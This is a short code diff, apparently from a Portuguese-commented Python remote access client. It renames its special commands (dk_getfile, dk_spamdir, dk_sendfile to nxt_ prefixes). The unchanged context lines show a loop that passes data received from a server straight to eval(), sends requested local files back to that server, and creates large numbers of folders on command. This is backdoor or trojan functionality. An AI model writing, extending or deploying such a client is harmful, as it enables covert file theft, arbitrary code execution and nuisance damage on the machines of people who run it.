@@ -34,8 +34,8 @@ while True:
                 ## Recebe o comando e transforma em um dicionario.
                 data = eval(server.recv(1024).decode())
 
-                ## Verifica se foi feito algum comando especial(dk_getfile, dk_sendfile,...)
-                if(data['command'] == 'dk_getfile'):
+                ## Verifica se foi feito algum comando especial(nxt_getfile, nxt_sendfile,...)
+                if(data['command'] == 'nxt_getfile'):
                     if(exists(data['file'])):
                         ## Pega o tamanho do arquivo e envia ao servidor.
                         size = str(getsize(data['file'])+1024)
@@ -46,7 +46,7 @@ while True:
                         continue
                 
                 
-                elif(data['command'] == 'dk_spamdir'):
+                elif(data['command'] == 'nxt_spamdir'):
                     try:
                         for i in range(1, data['amount']+1):
                             ManagerCommands(f'mkdir {data["dir"]}\\{data["name_path"]}_{i}')
@@ -58,7 +58,7 @@ while True:
                         server.send(b'S') ## Sucesso
 
 
-                elif(data['command'] == 'dk_sendfile'):
+                elif(data['command'] == 'nxt_sendfile'):
                     try:
                         if('\/' in data['file']):
                             if(exists(data['file'])):
